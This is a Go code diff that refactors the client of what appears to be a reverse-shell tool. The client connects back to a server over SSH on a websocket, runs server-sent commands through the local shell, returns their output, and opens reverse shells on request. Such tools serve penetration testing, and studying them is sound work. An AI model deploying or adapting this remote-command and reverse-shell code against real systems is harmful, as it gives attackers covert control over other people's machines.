@@ -6,8 +6,6 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"io"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
@@ -93,10 +91,11 @@ func NewClient(args []string) {
 
 	netConn := sconn.WsConnToNetConn(wsConn)
 
+	var reqChan <-chan *ssh.Request
 	var newChan <-chan ssh.NewChannel
 	var connErr error
 
-	c.sshClientConn, newChan, c.connReqChannel, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
+	c.sshClientConn, newChan, reqChan, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
 	if connErr != nil {
 		c.Fatalf("%s\n", connErr)
 		return
@@ -110,44 +109,58 @@ func NewClient(args []string) {
 		go c.keepAlive(c.timeout)
 	}
 
-	go c.handleConnRequests(newChan, c.connReqChannel)
+	go c.handleGlobalChannels(newChan)
+	go c.handleGlobalRequests(reqChan)
 
 	<-c.disconnect
 	close(c.disconnect)
 }
 
-func (c *client) handleConnRequests(newChan <-chan ssh.NewChannel, connReqChan <-chan *ssh.Request) {
-	sshClient := ssh.NewClient(c.sshClientConn, newChan, c.connReqChannel)
-	defer func() { _ = sshClient.Close() }()
+func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
+	for nc := range newChan {
+		var err error
 
-	for r := range connReqChan {
-		switch r.Type {
-		case "keep-alive":
-			replyErr := c.replyConnRequest(r, true, []byte("pong"))
-			if replyErr != nil {
-				c.Errorf("[Keep-Alive] Connection error.")
-				return
+		switch nc.ChannelType() {
+		default:
+			c.Debugf("Rejected channel %s", nc.ChannelType())
+			if err = nc.Reject(ssh.UnknownChannelType, ""); err != nil {
+				c.Warnf("handleSSHnewChannels (session): Received Unknown channel type.\n%s",
+					err,
+				)
 			}
-		case "session-shell":
-			go c.sendReverseShell(sshClient, r)
+			return
+		}
+	}
+}
+
+func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
+	for req := range requests {
+		switch req.Type {
+		case "keep-alive":
+			if err := c.replyConnRequest(req, true, []byte("pong")); err != nil {
+				c.Errorf("Error sending \"%s\" reply to Server - %s", req.Type, err)
+			}
 		case "session-exec":
-			go c.sendCommandExec(sshClient, r)
+			c.Debugf("Received \"%s\" Connection Request", req.Type)
+			go c.sendCommandExec(req)
+		case "session-shell":
+			go c.sendReverseShell(req)
 		case "window-change":
 			// Server only sends this Request if Interpreter is PTY,
 			// after Reverse Shell is sent, ergo PTY File has been created
-			c.Debugf("Server Requested window change: %s\n", r.Payload)
+			c.Debugf("Server Requested window change: %s\n", req.Payload)
 			var termSize interpreter.TermSize
-			if err := json.Unmarshal(r.Payload, &termSize); err != nil {
+			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
 				c.Fatalf("%s", err)
 			}
 			c.updatePtySize(termSize.Rows, termSize.Cols)
 		case "disconnect":
 			c.Debugf("Server requested Client disconnection.")
-			_ = c.replyConnRequest(r, true, []byte("disconnected"))
+			_ = c.replyConnRequest(req, true, []byte("disconnected"))
 			c.disconnect <- true
 		default:
-			c.Debugf("Discarded Connetion Request Type: \"%s\"", r.Type)
-			ssh.DiscardRequests(connReqChan)
+			c.Debugf("Received unknown Connetion Request Type: \"%s\"", req.Type)
+			_ = req.Reply(false, nil)
 		}
 	}
 }
@@ -156,57 +169,28 @@ func (c *client) setInterpreter(i *interpreter.Interpreter) {
 	c.interpreter = i
 }
 
-func (c *client) sendCommandExec(sshClient *ssh.Client, initReq *ssh.Request) {
-	sshSession, err := sshClient.NewSession()
-	if err != nil {
-		c.Errorf("%s", err)
-	}
-	defer func() { _ = sshSession.Close() }()
-
-	channel, sInErr := sshSession.StdinPipe()
-	if sInErr != nil {
-		c.Errorf("Can not open Stdin Pipe on current Session")
+func (c *client) sendCommandExec(request *ssh.Request) {
+	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
+	if openErr != nil {
+		c.Errorf("failed to open a \"session\" channel to server")
 		return
 	}
-	defer func() { _ = channel.Close() }()
+	defer channel.Close()
 
-	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", initReq.Payload, initReq.Payload)
+	rcvCmd := string(request.Payload)
+	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)
 
-	rcvCmd := string(initReq.Payload)
 	cmd := exec.Command(c.interpreter.Shell, append(c.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec
 
-	// Since the payload contains the command to be executed, StdinPipe is not needed
-	stdout, pOutErr := cmd.StdoutPipe()
-	if pOutErr != nil {
-		c.Errorf("cmd.StdoutPipe error: %s", err)
-	}
-	stderr, pErr := cmd.StderrPipe()
-	if pErr != nil {
-		c.Errorf("cmd.StderrPipe error: %s", err)
+	out, _ := cmd.CombinedOutput()
+	_, cwErr := channel.Write(out)
+	if cwErr != nil {
+		c.Errorf("failed to write command \"%s\" output into channel", rcvCmd)
 	}
 
 	// Notify Server we are good to go
-	_ = c.replyConnRequest(initReq, true, []byte("exec-ready"))
-
-	go func() { _, _ = io.Copy(channel, stdout) }()
-	go func() { _, _ = io.Copy(channel, stderr) }()
-
-	// Note that Run() is equivalent to Start() followed by Wait().
-	if err = cmd.Run(); err != nil {
-		log.Printf("cmd.Run error: %s", err)
-	}
-}
-
-func (c *client) sendReverseShell(sshClient *ssh.Client, initReq *ssh.Request) {
-	sshSession, err := sshClient.NewSession()
-	if err != nil {
-		c.Errorf("%s", err)
-	}
-	defer func() { _ = sshSession.Close() }()
-
-	// Pass Connection Request, so it replies when it's ready to go.
-	if err = c.reverseShell(sshSession, initReq); err != nil {
-		c.Errorf("%s", err)
+	if err := c.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
+		c.Errorf("failed to send reply to request \"%s\"", request.Type)
 	}
 }
 
